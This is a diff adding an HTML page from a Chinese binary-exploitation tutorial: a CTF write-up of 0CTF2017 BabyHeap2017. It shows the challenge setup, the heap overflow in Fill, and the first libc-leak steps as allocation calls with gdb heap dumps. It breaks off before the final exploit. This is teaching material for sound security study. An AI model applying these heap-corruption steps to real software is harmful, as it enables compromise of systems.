@@ -1,0 +1,1864 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta http-equiv="x-ua-compatible" content="ie=edge">
+      
+      
+      
+      
+        <meta name="lang:clipboard.copy" content="复制">
+      
+        <meta name="lang:clipboard.copied" content="已复制">
+      
+        <meta name="lang:search.language" content="jp">
+      
+        <meta name="lang:search.pipeline.stopwords" content="True">
+      
+        <meta name="lang:search.pipeline.trimmer" content="True">
+      
+        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
+      
+        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
+      
+        <meta name="lang:search.result.other" content="# 个符合条件的结果">
+      
+        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
+      
+      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-0.17.2, mkdocs-material-2.6.6">
+    
+    
+      
+        <title>0CTF2017 BabyHeap2017 - 二进制漏洞挖掘与利用</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/application.78aab2dc.css">
+      
+        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.6079476c.css">
+      
+    
+    
+      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
+    
+    
+      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+      
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
+        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
+      
+      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
+    
+    
+      <link rel="stylesheet" href="../../../_static/css/extra.css">
+    
+    
+  </head>
+  
+    
+    
+    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
+  
+    <svg class="md-svg">
+      <defs>
+        
+        
+      </defs>
+    </svg>
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
+    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
+    
+      <a href="#_1" tabindex="1" class="md-skip">
+        跳转至
+      </a>
+    
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid">
+    <div class="md-flex">
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <a href="../../.." title="二进制漏洞挖掘与利用" class="md-header-nav__button md-logo">
+          
+            <i class="md-icon">school</i>
+          
+        </a>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
+      </div>
+      <div class="md-flex__cell md-flex__cell--stretch">
+        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
+          
+            
+              <span class="md-header-nav__topic">
+                二进制漏洞挖掘与利用
+              </span>
+              <span class="md-header-nav__topic">
+                0CTF2017 BabyHeap2017
+              </span>
+            
+          
+        </div>
+      </div>
+      <div class="md-flex__cell md-flex__cell--shrink">
+        
+          
+            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
+            
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
+      <label class="md-icon md-search__icon" for="search"></label>
+      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
+        &#xE5CD;
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="result">
+          <div class="md-search-result__meta">
+            键入以开始搜索
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+          
+        
+      </div>
+      
+    </div>
+  </nav>
+</header>
+    
+    <div class="md-container">
+      
+        
+      
+      
+        
+
+  
+
+<nav class="md-tabs md-tabs--active" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../.." title="简介" class="md-tabs__link">
+          简介
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../stackoverflow/stack_intro/" title="栈溢出" class="md-tabs__link">
+          栈溢出
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞" class="md-tabs__link">
+          格式化字符串漏洞
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../heap/introduction/" title="堆利用" class="md-tabs__link">
+          堆利用
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../io_file/introduction/" title="IO_FILE 利用" class="md-tabs__link">
+          IO_FILE 利用
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../race-condition/introduction/" title="条件竞争" class="md-tabs__link">
+          条件竞争
+        </a>
+      
+    </li>
+  
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../6.1.1_pwn_hctf2016_brop/" title="练习" class="md-tabs__link md-tabs__link--active">
+          练习
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+      
+      <main class="md-main">
+        <div class="md-main__inner md-grid" data-md-component="container">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" data-md-level="0">
+  <label class="md-nav__title md-nav__title--site" for="drawer">
+    <span class="md-nav__button md-logo">
+      
+        <i class="md-icon">school</i>
+      
+    </span>
+    二进制漏洞挖掘与利用
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
+    
+    <label class="md-nav__link" for="nav-1">
+      简介
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-1">
+        简介
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../.." title="简介" class="md-nav__link">
+      简介
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
+    
+    <label class="md-nav__link" for="nav-2">
+      栈溢出
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        栈溢出
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/stack_intro/" title="栈介绍" class="md-nav__link">
+      栈介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
+      栈溢出原理
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/basic_rop/" title="基本 ROP" class="md-nav__link">
+      基本 ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/others/" title="花式栈溢出技巧" class="md-nav__link">
+      花式栈溢出技巧
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/medium_rop/" title="中级 ROP" class="md-nav__link">
+      中级 ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../stackoverflow/advanced_rop/" title="高级 ROP" class="md-nav__link">
+      高级 ROP
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
+    
+    <label class="md-nav__link" for="nav-3">
+      格式化字符串漏洞
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-3">
+        格式化字符串漏洞
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
+      格式化字符串漏洞原理介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
+      格式化字符串漏洞利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
+      格式化字符串漏洞例子
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
+      格式化字符串漏洞检测
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
+    
+    <label class="md-nav__link" for="nav-3-5">
+      实验
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-3-5">
+        实验
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../fmtstr/example/picoctf-2014-guess/Write-up_cn/" title="picoctf-2014 guess" class="md-nav__link">
+      picoctf-2014 guess
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
+    
+    <label class="md-nav__link" for="nav-4">
+      堆利用
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-4">
+        堆利用
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/introduction/" title="堆利用简介" class="md-nav__link">
+      堆利用简介
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_overview/" title="堆概述" class="md-nav__link">
+      堆概述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_structure/" title="堆相关数据结构" class="md-nav__link">
+      堆相关数据结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
+      深入理解堆的实现
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/heapoverflow_basic/" title="堆溢出" class="md-nav__link">
+      堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
+      堆中的 Off-By-One
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/unlink/" title="Unlink" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/use_after_free/" title="Use After Free" class="md-nav__link">
+      Use After Free
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
+      Fastbin Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/chunk_extend_shrink/" title="Chunk Extend / Shrink" class="md-nav__link">
+      Chunk Extend / Shrink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
+      House Of Einherjar
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_lore/" title="House of Lore" class="md-nav__link">
+      House of Lore
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_force/" title="House Of Force" class="md-nav__link">
+      House Of Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
+      Unsorted Bin Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../heap/house_of_orange/" title="House of Orange" class="md-nav__link">
+      House of Orange
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      IO_FILE 利用
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        IO_FILE 利用
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
+      FILE 文件结构介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
+      伪造 vtable 劫持程序流程
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/fsop/" title="FSOP" class="md-nav__link">
+      FSOP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/exploit-in-libc2.24/" title="新版本 libc 下 IO_FILE 的利用" class="md-nav__link">
+      新版本 libc 下 IO_FILE 的利用
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      条件竞争
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        条件竞争
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
+      条件竞争介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../race-condition/problem/" title="例题" class="md-nav__link">
+      例题
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7" checked>
+    
+    <label class="md-nav__link" for="nav-7">
+      练习
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-7">
+        练习
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.1_pwn_hctf2016_brop/" title="HCTF2016 brop" class="md-nav__link">
+      HCTF2016 brop
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.2_pwn_njctf2017_pingme/" title="NJCTF2017 pingme" class="md-nav__link">
+      NJCTF2017 pingme
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.3_pwn_xdctf2015_pwn200/" title="XDCTF2015 pwn200" class="md-nav__link">
+      XDCTF2015 pwn200
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.4_pwn_backdoorctf2017_fun_signals/" title="BackdoorCTF2017 Fun-Signals" class="md-nav__link">
+      BackdoorCTF2017 Fun-Signals
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.5_pwn_grehackctf2017_beerfighter/" title="GreHackCTF2017 beerfighter" class="md-nav__link">
+      GreHackCTF2017 beerfighter
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.6_pwn_defconctf2015_fuckup/" title="DefconCTF2015 fuckup" class="md-nav__link">
+      DefconCTF2015 fuckup
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.7_pwn_0ctf2015_freenote/" title="0CTF2015 freenote" class="md-nav__link">
+      0CTF2015 freenote
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.8_pwn_dctf2017_flex/" title="DCTF2017 Flex" class="md-nav__link">
+      DCTF2017 Flex
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.9_rhme3_exploitation/" title="RHme3 Exploitation" class="md-nav__link">
+      RHme3 Exploitation
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="toc">
+        0CTF2017 BabyHeap2017
+      </label>
+    
+    <a href="./" title="0CTF2017 BabyHeap2017" class="md-nav__link md-nav__link--active">
+      0CTF2017 BabyHeap2017
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="题目复现" class="md-nav__link">
+    题目复现
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="题目解析" class="md-nav__link">
+    题目解析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leak-libc" title="leak libc" class="md-nav__link">
+    leak libc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-shell" title="get shell" class="md-nav__link">
+    get shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" title="exploit" class="md-nav__link">
+    exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="参考资料" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../6.1.11_9447ctf2015_search_engine/" title="9447CTF2015 Search-Engine" class="md-nav__link">
+      9447CTF2015 Search-Engine
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+  
+    <label class="md-nav__title" for="toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="题目复现" class="md-nav__link">
+    题目复现
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="题目解析" class="md-nav__link">
+    题目解析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leak-libc" title="leak libc" class="md-nav__link">
+    leak libc
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#get-shell" title="get shell" class="md-nav__link">
+    get shell
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit" title="exploit" class="md-nav__link">
+    exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" title="参考资料" class="md-nav__link">
+    参考资料
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  <h1>0CTF2017 BabyHeap2017</h1>
+                
+                <ul>
+<li><a href="#题目复现">题目复现</a></li>
+<li><a href="#题目解析">题目解析</a></li>
+<li><a href="#参考资料">参考资料</a></li>
+</ul>
+<p><a href="../../src/writeup/6.1.10_0ctf2017_babyheap2017">下载文件</a></p>
+<h2 id="_1">题目复现<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>这个题目给出了二进制文件。在 Ubuntu 16.04 上，libc 就用自带的。
+<div class="codehilite"><pre><span></span>$ file babyheap
+babyheap: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e5bfa980355d6158a76acacb7bda01f4e3fc1c2, stripped
+$ checksec -f babyheap
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY   Fortified Fortifiable  FILE
+Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   Yes       0               2       babyheap
+$ file /lib/x86_64-linux-gnu/libc-2.23.so
+/lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=088a6e00a1814622219f346b41e775b8dd46c518, for GNU/Linux 2.6.32, stripped
+</pre></div>
+64 位程序，保护全开。</p>
+<p>把它运行起来：
+<div class="codehilite"><pre><span></span>socat tcp4-listen:10001,reuseaddr,fork exec:./babyheap &amp;
+</pre></div></p>
+<p>一个典型的堆利用题目：
+<div class="codehilite"><pre><span></span>$ ./babyheap
+===== Baby Heap in 2017 =====
+1. Allocate
+2. Fill
+3. Free
+4. Dump
+5. Exit
+Command: 1      // 分配一个指定大小的 chunk
+Size: 5
+Allocate Index 0
+1. Allocate
+2. Fill
+3. Free
+4. Dump
+5. Exit
+Command: 2      // 将指定大小数据放进 chunk，但似乎没有进行边界检查，导致溢出
+Index: 0
+Size: 10
+Content: aaaaaaaaaa     // 10个a
+1. Allocate
+2. Fill
+3. Free
+4. Dump
+5. Exit
+Command: 1. Allocate    // 似乎触发了什么 bug，如果是9个a就没事
+2. Fill
+3. Free
+4. Dump
+5. Exit
+Command: 4      // 打印出 chunk 的内容，长度是新建时的长度，而不是放入数据的长度
+Index: 0
+Content:
+aaaaa
+1. Allocate
+2. Fill
+3. Free
+4. Dump
+5. Exit
+Command: 3      // 释放 chunk
+Index: 0
+1. Allocate
+2. Fill
+3. Free
+4. Dump
+5. Exit
+Command: 5
+</pre></div></p>
+<h2 id="_2">题目解析<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>根据前面所学的知识，我们知道释放且只释放了一个 chunk 后，该 free chunk 会被加入到 unsorted bin 中，它的 fd/bk 指针指向了 libc 中的 main_arena 结构。我们已经知道了 Fill 数据的操作存在溢出漏洞，但并没有发现 UAF 漏洞，所以要想泄露出 libc 基址，得利用 Dump 操作。另外内存分配使用了 calloc 函数，这个函数与 malloc 的区别是，calloc 会将分配的内存空间每一位都初始化为 0，所以也不能通过分配和释放几个小 chunk，再分配一个大 chunk，来泄露其内容。</p>
+<p>怎么利用 Dump 操作呢？如果能使两个 chunk 相重叠，Free 一个，Dump 另一个，或许可行。</p>
+<h4 id="leak-libc">leak libc<a class="headerlink" href="#leak-libc" title="Permanent link">&para;</a></h4>
+<p>还是一样的，为了方便调试，先关掉 ASLR。首先分配 3 个 fast chunk 和 1 个 small chunk，其实填充数据对漏洞利用是没有意义的，这里只是为了方便观察：
+<div class="codehilite"><pre><span></span><span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x10</span><span class="p">)</span>
+<span class="n">alloc</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">fill</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">128</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>gef➤  x/40gx 0x0000555555757010-0x10
+0x555555757000: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 0
+0x555555757010: 0x4141414141414141  0x4141414141414141
+0x555555757020: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 1
+0x555555757030: 0x4141414141414141  0x4141414141414141
+0x555555757040: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 2
+0x555555757050: 0x4141414141414141  0x4141414141414141
+0x555555757060: 0x0000000000000000  0x0000000000000021  &lt;-- chunk 3
+0x555555757070: 0x4141414141414141  0x4141414141414141
+0x555555757080: 0x0000000000000000  0x0000000000000091  &lt;-- chunk 4
+0x555555757090: 0x4141414141414141  0x4141414141414141
+0x5555557570a0: 0x4141414141414141  0x4141414141414141
+0x5555557570b0: 0x4141414141414141  0x4141414141414141
+0x5555557570c0: 0x4141414141414141  0x4141414141414141
+0x5555557570d0: 0x4141414141414141  0x4141414141414141
+0x5555557570e0: 0x4141414141414141  0x4141414141414141
+0x5555557570f0: 0x4141414141414141  0x4141414141414141
+0x555555757100: 0x4141414141414141  0x4141414141414141
+0x555555757110: 0x0000000000000000  0x0000000000020ef1  &lt;-- top chunk
+0x555555757120: 0x0000000000000000  0x0000000000000000
+0x555555757130: 0x0000000000000000  0x0000000000000000
+gef➤  x/20gx 0xafc966564d0-0x10
+0xafc966564c0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 0 -&gt; chunk 0
+0xafc966564d0:  0x0000555555757010  0x0000000000000001  &lt;-- idx 1 -&gt; chunk 1
+0xafc966564e0:  0x0000000000000010  0x0000555555757030
+0xafc966564f0:  0x0000000000000001  0x0000000000000010  &lt;-- idx 2 -&gt; chunk 2
+0xafc96656500:  0x0000555555757050  0x0000000000000001  &lt;-- idx 3 -&gt; chunk 3
+0xafc96656510:  0x0000000000000010  0x0000555555757070
+0xafc96656520:  0x0000000000000001  0x0000000000000080  &lt;-- idx 4 -&gt; chunk 4
+0xafc96656530:  0x0000555555757090  0x0000000000000000
+0xafc96656540:  0x0000000000000000  0x0000000000000000
+0xafc96656550:  0x0000000000000000  0x0000000000000000
+</pre></div>
+另外我们看到，chunk 的序号被存储到一个 mmap 分配出来的结构体中，包含了 chunk 的地址和大小。程序就是通过该结构体寻找 chunk，然后各种操作的。</p>
+<p>free 掉两个 fast chunk，这样 chunk 2 的 fd 指针会被指向 chunk 1：
+<div class="codehilite"><pre><span></span><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</pre></div>
+<div class="codehilite"><pre><span></span>gef➤  x/2gx &amp;main_arena
+0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000  0x0000555555757040
+gef➤  heap bins fast
+[ Fastbins for arena 0x7ffff7dd1b20 ]
